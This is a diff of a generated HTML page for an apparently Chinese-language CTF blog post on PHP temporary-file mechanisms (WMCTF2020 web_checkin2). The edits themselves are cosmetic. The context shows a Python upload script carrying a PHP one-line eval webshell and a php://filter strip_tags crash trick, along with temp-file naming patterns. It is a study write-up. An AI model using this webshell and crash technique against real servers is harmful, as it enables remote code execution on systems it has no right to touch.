@@ -59,7 +59,7 @@
   </style>
   <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
   </style>
-<meta name="generator" content="Hexo 5.1.1"></head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
   <div class="scrollbar" id="bar">
@@ -306,10 +306,10 @@
 <h1 id="临时文件的命名规则"><a href="#临时文件的命名规则" class="headerlink" title="临时文件的命名规则"></a>临时文件的命名规则</h1><p>默认为<code>php + 4/6位随机数字和大小写字母</code>，Windows环境下还会有<code>.tmp</code>文件后缀</p>
 <ul>
 <li><p>Windows环境</p>
-<pre><code class="php">php[0-9A-Za-z]&#123;4&#125;.tmp</code></pre>
+<pre><code class="php">php[0-9A-Za-z]{4}.tmp</code></pre>
 </li>
 <li><p>Linux环境</p>
-<pre><code class="php">php[0-9A-Za-z]&#123;6&#125;</code></pre>
+<pre><code class="php">php[0-9A-Za-z]{6}</code></pre>
 </li>
 </ul>
 <h1 id="临时文件的正常存活周期"><a href="#临时文件的正常存活周期" class="headerlink" title="临时文件的正常存活周期"></a>临时文件的正常存活周期</h1><p>![截屏2020-08-12 下午2.23.57](学习PHP临时文件机制与利用/截屏2020-08-12 下午2.23.57.png)</p>
@@ -346,10 +346,10 @@ s = requests.session()
 
 url=&#39;http://127.0.0.1:8080/WMCTF2020/web_checkin2/?content=php://filter/string.strip_tags/resource=geekcat.php&#39; 👈
 
-files = &#123;
+files = {
     &quot;demo&quot;:(&quot;test.jpg&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;test&quot;,&quot;image/jpeg&quot;), 👈 注意test标识号
     &quot;submit&quot;:(None,&quot;submit&quot;)
-&#125;
+}
 s.post(url,files=files)</code></pre>
 <p>![截屏2020-08-12 下午4.06.38](学习PHP临时文件机制与利用/截屏2020-08-12 下午4.06.38.png)</p>
 <p>👆执行脚本时apache会报段错误，文件会存入tmp文件夹；</p>
@@ -392,7 +392,7 @@ for i in charset:
 <li>string.strip_tags - 从字符串中去除 HTML 和 PHP 标记</li>
 <li>convert.quoted-printable-encode - 将 8-bit 字符串转换成 quoted-printable 字符串</li>
 </ul>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/183046">PHP临时文件机制与利用的思考</a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.anquanke.com/post/id/183046" target="_blank" rel="noopener">PHP临时文件机制与利用的思考</a></p>
 <p><strong>郑重感谢</strong></p>
 
         </div>
